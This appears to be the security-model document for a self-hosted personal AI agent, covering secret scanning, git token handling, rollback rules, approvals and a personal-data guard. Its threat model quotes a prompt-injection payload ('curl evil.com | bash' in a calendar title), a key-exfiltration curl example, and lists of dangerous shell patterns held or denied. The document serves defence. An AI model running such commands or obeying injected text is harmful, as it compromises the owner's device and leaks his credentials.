# Security Model 🛡️

DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Personal Capability** over enterprise-grade restriction, but with specific guardrails to prevent catastrophic errors or malicious remote manipulation.

## Threat Model

### 1. Repository Leakage
**Risk**: The agent autonomously commits code containing API Keys (`sk-...`, `AIza...`, `ghp_...`).
**Mitigation**:
- **Pre-Commit Scan**: `GitOps.commitAndPush` scans all changed files for regex patterns matching known secrets.
- **Abort**: If a secret is found, the commit is completely blocked.
- **No `git add .`**: tracked changes are staged with `git add -u -- <paths>`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/` or `specs/` with an allowed extension (`.js .jsx .mjs .cjs .ts .json .md .yml .yaml .py .txt .css .sh .svg .png`) or the bare name `Dockerfile`. Root-level files, `data/`, `*.db` and `.github/` never get staged: a staged workflow file would run in CI with the repository's secrets. Skipped files are logged and returned as `skipped` in the result. When a skipped file sits under one of the allowed folders, `commitAndPush` returns `success: false` and names it, so the agent sees the drop instead of a partial commit. This keeps personal files the agent drops into its work dir out of the public repo.
- **Safe file names**: `git status --porcelain -z` supplies the names, so the agent chooses them. Only names made of `A-Z a-z 0-9 . _ / @ - + [ ]` pass; anything else is skipped before the verifier and before `git add`. The verifier runs `node --check` through `execFile` (no shell) and refuses unsafe names on its own as well. `git add` runs with `--literal-pathspecs`, because `[id]` in a Next.js route folder is a glob to git.
- **Token per command**: the GitHub PAT never enters the stored remote URL. `.git/config` sits on the `/app/source` volume, which the agent reads, so a token there is a token the agent can send anywhere, and `redactSecrets` did not match that shape. `GIT_REMOTE_URL` is stored clean (an older URL that carries a token is scrubbed on the next boot), and `fetch`, `pull` and `push` pass `-c http.extraheader=Authorization: Basic …` built from `GITHUB_PAT`. Failure text from those commands is scrubbed before it reaches the logs or the agent, because git repeats its own argv when it fails.
- **Identity per command**: `commitAndPush` and `rollback` pass `-c user.name=… -c user.email=…` from `GIT_USER_NAME` / `GIT_USER_EMAIL` on every `git commit` and `git revert`. The agent can rewrite `.git/config` in the shared `/app/source` volume; that no longer changes who authored a commit.

### 2. Remote Code Execution (RCE) via Prompt Injection
**Risk**: An attacker sends a calendar invite or email with a title like `Meeting | curl evil.com | bash`. If the agent processes this text into a shell command, the device is compromised.
**Mitigation**:
- **Confirmation Manager**:
    - **Held for approval**: `| bash`, `| sh`, `| python`, `| node`, `bash <(...)`, `sh -c "$(...)"`, `rm -rf /`, writes under `/etc`, `mkfs`, `dd` to a disk. See **Approvals** below.
    - **Allowed**: `curl`, `wget`, `ls`, `grep` (Standard tools are fine).
- **Untrusted Sources**: (Future) Inputs from Email/Calendar will be tagged as "Untrusted" and prevented from triggering specific tools.

### 3. Logic Failure
**Risk**: The agent pushes an update that runs (no crash) but is logically broken (e.g. infinite loop, or always returns empty text).
**Mitigation**:
- **Supervisor Integration Tests**:
    - Every hour, the Supervisor sends a `POST /v1/chat` request (`HEALTH_CHECK_PING_123`) to the Agent.
    - If the Agent does not reply with a correct confirmation, the Supervisor rolls back the code.
- **Self-healing rollback (self-commits only)**:
    - The Supervisor reads `HEAD` with `git log -1 --pretty=format:%H%x09%ae%x09%s` through `execFile` (no shell) and compares the hash with `.last_boot_commit`.
    - The 10-minute rollback window opens only when all hold: `HEAD` is new since the last boot; its author is the Supervisor's own git email (`GIT_USER_EMAIL`, default `supervisor@deedee.bot`); its subject does not start with `Revert "`; its hash is not the one in `.last_rollback_commit`.
    - Any other start (reboot, crash, Balena deploy, owner merge, own rollback) keeps the window closed. The Supervisor still alerts on Slack, but never reverts.
    - **Per-tick reassessment**: Balena restarts only services whose image changed, so an agent-only self-commit never restarts the Supervisor. Every health check tick re-reads `HEAD`; when the hash moved since the last assessment, the same rules run again and `.last_assessed_commit` is updated. The tick never writes `.last_boot_commit`; only start does. So when Balena later restarts the Supervisor on a deployed self-commit, `HEAD` still differs from the boot anchor and the window opens again for that commit. A second restart on the same commit keeps it closed.
    - **Revert exclusion**: `git revert` writes the revert commit with the Supervisor's own email. Without the two rules above, a revert would look like a fresh self-commit, reopen the window, and a still-failing agent would make the Supervisor revert the revert. After a rollback the Supervisor stores the revert hash in `.last_rollback_commit` and refuses to roll that hash back.
    - Before reverting, `GitOps.rollback` checks that `HEAD` is still the self-commit hash recorded at the last assessment. If `HEAD` moved, it aborts and logs.
    - **State dir**: `.last_boot_commit`, `.last_assessed_commit` and `.last_rollback_commit` live in `SUPERVISOR_STATE_DIR` (default `/app/state`, the `supervisor-state` volume). The agent cannot reach it; the old copy in `/app/source` is read once and migrated.
    - Every outbound `fetch` (agent health, deep check, Slack) uses `AbortSignal.timeout(10000)`. A hung Slack call cannot stall start-up.
    - `SUPERVISOR_AUTO_ROLLBACK=false` turns rollback off entirely. Alerts stay on.

## Access Control

### Filesystem
- **Read/Write**: `/app/source` (The repo itself).
- **Read/Write**: `/app/data` (Persistent DBs).
- **Supervisor only**: `/app/state` (`supervisor-state` volume; rollback trust anchors). Not mounted into the agent.
- **Interfaces only**: `interfaces-data` (WhatsApp session credentials and message database). Not mounted into the agent: a shell command there would have read the credentials that own the owner's WhatsApp account. The agent asks the interfaces service for the day's messages over `GET /internal/whatsapp/messages-by-date` (bearer `DEEDEE_INTERNAL_TOKEN`, which an `DEEDEE_API_TOKEN` holder does not have).
- **Read-Only**: `/proc`, `/sys`.

### Network
- **Outbound**: Unrestricted (needed for API calls, fetch).
- **Inbound**: None (container isolation).
- **Service Mesh**:
    - **`apps/web`**: Public UI. Browser-facing auth handled by the built-in `/login` page (password + passkey, signed JWT cookie). See **User Authentication** below.
    - **`apps/api`**: Public Gateway. `/v1/*` enforces Bearer Auth (`DEEDEE_API_TOKEN`). `/socket.io` verifies the session JWT cookie issued by `apps/web` (shared `SESSION_SECRET`).
    - **`apps/agent`**: Internal Only. Protected by Docker Network isolation **plus** `DEEDEE_INTERNAL_TOKEN` on `/internal/*` (defense-in-depth so accidental port exposure doesn't leak vault files / wardrobe images / journal data). Enforces Path Validation on Journal Ops.
    - **`apps/supervisor`**: Internal Only. Protected by `SUPERVISOR_TOKEN` to prevent SSRF->RCE lateral movement.

## User Authentication

DeeDee is single-user. Browser sessions are gated by a self-contained `/login` page; no reverse-proxy forward-auth required.

- **Password**: scrypt hash (N=32768, r=8, p=1) stored in `data/auth.json` on the `web-data` Docker volume. Set via `LOGIN_PASSWORD` env var (idempotent on every boot — also acts as the recovery path) or `npm run auth:init`.
- **Passkeys (WebAuthn)**: Optional. Self-service enrollment at `/settings/security`. Requires `WEBAUTHN_RP_ID` + HTTPS `WEBAUTHN_ORIGIN`. Disabled automatically on plain HTTP except `localhost`.
- **Sessions**: Signed JWT (HS256 + `SESSION_SECRET`) in an `httpOnly; Secure; SameSite=Lax` cookie. 30-day TTL with sliding refresh — re-issued on the next authenticated request once the token is past half-life, so weekly use never requires re-login.
- **Logout**: Clears the cookie and adds the JTI to the revocation list in `auth.json`. Rotate `SESSION_SECRET` to invalidate all outstanding sessions.
- **Rate limit**: `/api/auth/login`, `/api/auth/passkey/login/*` and `/api/auth/password` are capped at 5 attempts per 15 minutes per IP.
  A second, global bucket counts failed password logins across all IPs: 50 failures in 10 minutes pause password sign-in (429, `paused: true`).
  Only `/api/auth/login` reads or feeds that bucket, so passkey sign-in and the session-gated password change keep working during a spray.
- **Cross-subdomain (two-subdomain deploy)**: Set `COOKIE_DOMAIN=.example.com` so the cookie rides to `api.example.com` for socket.io. WebAuthn RP ID stays scoped to the UI subdomain.
- **Backups**: `web-data` (containing `auth.json`) is **excluded from the backup recipe**. Recovery is "set `LOGIN_PASSWORD` again, restart web, re-enroll passkeys" — safer than backing up the password hash and credential public keys.

For the env-var inventory and two-subdomain vs single-subdomain recipes, see the [Authentication Setup](../README.md#-authentication-setup) section in the README.

### Tools
- **GSuite**: Full Read/Write access to Calendar and Mail. Every email send waits for the owner (see Approvals).
- **Home Assistant**: Full Control (lights, switches, media, climate, covers). Locks, the alarm, opening a garage door and mass actions wait for the owner.

## Subprocess environments

The agent process holds every provider key. Child processes do not.

- **Shell tools**: `runShellCommand` starts its child with `PATH`, `HOME`, `TZ`
  and `LANG` only. `SHELL_ENV_PASSTHROUGH` (names separated by commas or
  spaces) adds more. A command like `curl -d "$GOOGLE_API_KEY" https://…`
  therefore sends nothing, which matters because output redaction cannot help
  when a command returns no output.
- **MCP servers**: every stdio server starts with a fixed base list
  (`MCP_BASE_ENV_VARS` in `apps/agent/src/mcp-manager.js`: shell, locale, TLS
  trust store, python and Chromium paths) plus the variables its own block in
  `mcp_config.json` names, with `${VAR}` placeholders resolved from the
  agent's environment. So the Plex server sees `PLEX_TOKEN` and nothing else.
  `MCP_ENV_PASSTHROUGH` adds names to the base for every server.
- **Output redaction** stays as a second layer: values of secret-named
  variables, secret-named `NAME=value` lines, GitHub tokens (`ghp_`, `ghs_`,
  `github_pat_`) and any URL carrying a user or password are replaced before
  tool output reaches the model, the logs or the database.

## Secrets the API never serves

- **Settings**: `GET /internal/settings` (proxied as `/v1/settings`) replaces
  every secret-looking value with `{ __secret: true, set: boolean }`. A save
  that sends the marker back keeps the stored value; `""` clears it. Saves
  broadcast the setting name only, because a socket reaches every client.
- **Browser secrets**: `GET /v1/browser-secrets` returns names.
  `PUT`/`DELETE /v1/browser-secrets/<NAME>` set or remove one. The Settings
  page can show that a secret is set, replace it and remove it, without ever
  receiving a value.

## Approvals

Some tool calls pause until the owner says yes. Before this change the
prompt went to the chat that started the run. For a scheduled job or a
watcher that chat is synthetic, so the prompt was dropped and the action
was denied without anyone knowing. Now the prompt reaches the owner, the
pending call survives a restart, and `/confirm <id>` works from any of his
chats. The owner values capability over restriction: everyday actions run
unasked, and jobs stay quiet unless they truly need him.

**What pauses** (`apps/agent/src/confirmation-manager.js`, flags in `tools-definition.js`):
- every email send (`sendEmail`, Gmail `messages.send` / `drafts.send`);
- the first `sendMessage` to a contact the owner never messaged through Deedee (the old `force: true` retry is gone; an approved call opens the contact);
- Home Assistant `lock` (lock and unlock), `alarm_control_panel` (arm and disarm), opening a cover whose id reads as a garage or gate (`garage`, `gate`, `portón`, `cochera`, `driveway`), the `homeassistant`/`hassio` domains, automations off, and `entity_id: all` on any domain except lights/switches/media off and lights on. `ha_bulk_control` pauses only when one of its operations touches those. Climate, blinds, closing the garage and bulk light control run unasked;
- appointment tools named `*book_appointment` / `*cancel_appointment` (Allende) and `*book_turn` / `*cancel_turn` (Pilotfy);
- `commitAndPush` (code that will run on the device);
- data-destroying deletes: `deletePerson`, `deleteVault`, `delete_garment`, `deleteDeviceAlias` (per-tool flags), Plex deletes and edits, and `ha_config_remove_*` / `ha_remove_device|entity|zone|area_or_floor|helpers_integrations`. Everyday removals run unasked: `ha_remove_todo_item`, Plex `playlist_remove_from` / `collection_remove_from`, `remove_from_wardrobe_trip_capsule`, `cancelJob`;
- shell commands that pipe remote content into an interpreter, damage the system, touch the databases, the WhatsApp credentials volume, the browser profile or the CDP port.

A rule that throws on odd arguments counts as a hit. A malformed call is
held, never let through.

**Where the prompt goes** (`apps/agent/src/services/approval-service.js`):
- web, Telegram and the owner's own WhatsApp chat: the same chat (`interactive`);
- scheduled jobs (whatever chat they were created from), system runs, watcher
  runs, other WhatsApp chats: the owner channel from `notification_channel`
  (`deferred`), through the delivery ledger (`docs/notifications.md`, kind
  `approval`) with the fallback channel. A job created from a web chat also
  gets a copy of the card in that web chat, with Approve / Deny buttons;
- sub-agents cannot ask; the tool result tells them to report the need to the parent.

The row is keyed by the chat that must answer, not by the chat that
started the run, so a watcher run on a contact's message never asks the
contact.

**The card** names the tool, the key arguments (values under keys such as
`password`, `token`, `secret` show as `<redacted>`), the reason, where the
run came from, and how to answer. Web chats also get Approve / Deny
buttons; the dashboard bell gets a notification.

**Answers**: `/confirm <id>`, `/approve <id>`, `/cancel <id>`, `/deny <id>`
work from any of the owner's chats (web, his Telegram, his WhatsApp);
`/approvals` lists every pending row. A plain reply (`yes`, `si`, `sí`,
`ok`, `dale`, `approve`, `confirm`; `no`, `cancel`, `cancelar`, `deny`)
counts only when all three hold: the card was delivered to this very chat
(for a job, that is the owner channel), it is the only approval pending
there, and no `askUser` question is open there. In every other case the
word goes on to `askUser` and the model, so an "ok" typed to the model in
another chat never fires a job's paused action. When a question is open,
`askUser` reads the reply first. The bare `/confirm` and `/cancel` act only
with exactly one approval pending in the chat they are typed in; with
several, the reply lists the ids and an id (or a unique prefix of at least
3 characters) is required. Only the first answer counts. The owner's
WhatsApp LID and his phone JID are the same chat.

**What runs after yes**: an interactive call resumes in its chat as before
(`EXECUTE_PENDING`). A deferred call runs from the service with the stored
arguments in the original run's context (source, chat id, job name), and
the result summary goes back to the chat the answer came from. The
executor receives `context.approved = true`.

**Expiry**: a sweeper runs every minute. Chat approvals expire after 30
minutes, job and watcher approvals after 6 hours. Both live in the
`approvals` agent setting (`ttlInteractiveMin`, `ttlDeferredHours`).
Pending rows survive a restart; only overdue ones are dropped at boot. An
overdue row the sweeper has not reached yet cannot be approved or denied,
from the chat, the settings card or the API: `decide()` marks it expired
and says so.

**Deny-list**: `approvals.deny` holds glob patterns matched against
`toolName:argsJson` (keys sorted); a pattern without `:` matches the tool
name alone. A hit fails the call at once in every mode, jobs included, and
nothing is sent to the owner. Env fallback: `APPROVALS_DENY`, patterns
separated by `;` or newlines. Example: `runShellCommand:*rm -rf*;commitAndPush`.

**Where to look**: Settings > Approvals (pending list with Approve / Deny,
TTLs, deny-list editor); `GET /v1/approvals`, `POST /v1/approvals/:id/approve|deny`
(agent: `/internal/approvals`, behind `DEEDEE_INTERNAL_TOKEN`); table
`pending_confirmations` in `agent.db`; logs with the `[Approvals]` prefix.

Still open (Batch 6): an exact allowlist for `runShellCommand` and network
tools instead of pattern checks.

## Personal data guard

The repo is public. `scripts/check-pii.js` blocks personal data and secrets before they land. It needs Node only, no packages.

**What it blocks**
- Argentine phone numbers (`549` + 8-10 digits) and any other run of 11 or more digits. There is no upper bound, so 16-digit card-like numbers are checked too.
- WhatsApp ids with real-looking digits: `<digits>@s.whatsapp.net`, `<digits>@lid`, `<digits>@g.us`.
- Secret-looking tokens: Google API keys (`AIza`) and OAuth tokens (`ya29.`), Slack tokens (`xoxb-`, `xoxa-`, `xoxp-`) and webhook URLs, GitHub tokens (`ghp_`, `github_pat_`), Tailscale keys (`tskey-`), private key blocks.
- Private LAN addresses (`10.x.x.x`, `192.168.x.x` with numeric octets).
- Anything that matches your local `.pii-denylist` (see below).

**What it allows**
- Digit runs with fewer than 4 distinct digits (`5490000000000`, `100000000000001`), `549` plus a near-constant tail (`5490000000001`), monotone sequences (`1234567890`) and the fictional US 555 range (`15551234567`).
- Epoch milliseconds: 13-digit runs from `1500000000000` to `1999999999999`, that is 2017-07-14 to 2033-05-18. Timestamps outside that range trip the guard; use `1700000000000` in fixtures.
- Telegram supergroup and channel ids: `-100` followed by 10 digits, sign included. The same digits without the sign are checked as a normal long number.
- Token placeholders made of repeated characters (`AIzaXXXX...`, `xoxb-XXXX`).
- A line that carries `pii-guard: allow`. Use it only for pattern definitions and synthetic test fixtures.

**Where it runs**
- `.husky/pre-commit` scans the staged diff on every commit.
- The `pii-guard` job in `.github/workflows/ci.yml` scans added lines on pull requests (`--range origin/master...HEAD`) and the whole tree on pushes to `master`.

**Run it yourself**
```bash
node scripts/check-pii.js                                # whole tree
node scripts/check-pii.js --range origin/master...HEAD   # your branch
node scripts/check-pii.js --staged --fix-hints           # staged changes, with placeholder hints
```
Each hit prints as `file:line: <masked match> [rule]`. Exit code 1 means hits, 2 means a usage or git error. Denylist problems never change the exit code.

**Denylist for names**
Names cannot go into a public pattern list. Put them in `.pii-denylist`: one regex per line, `#` starts a comment, matching ignores case. The guard looks in this order and uses the first file it finds:
1. the path given with `--denylist <file>`;
2. `.pii-denylist` at the repo root (gitignored, so it stays on your machine and CI never sees it);
3. `$HOME/.config/deedee/.pii-denylist`, which covers every clone and worktree at once.

When no file exists the guard prints one hint line (`pii-guard: no denylist found ...`) and checks the built-in rules only; the exit code does not change. A line that is not a valid regex prints a warning and is skipped; the other lines still apply.

**History**
Commits from before this guard may still hold phone numbers or ids. The guard does not scan history. The owner decides whether to rewrite history, which changes every commit hash and forces every clone to re-fetch, or to accept it and rotate anything that was exposed.
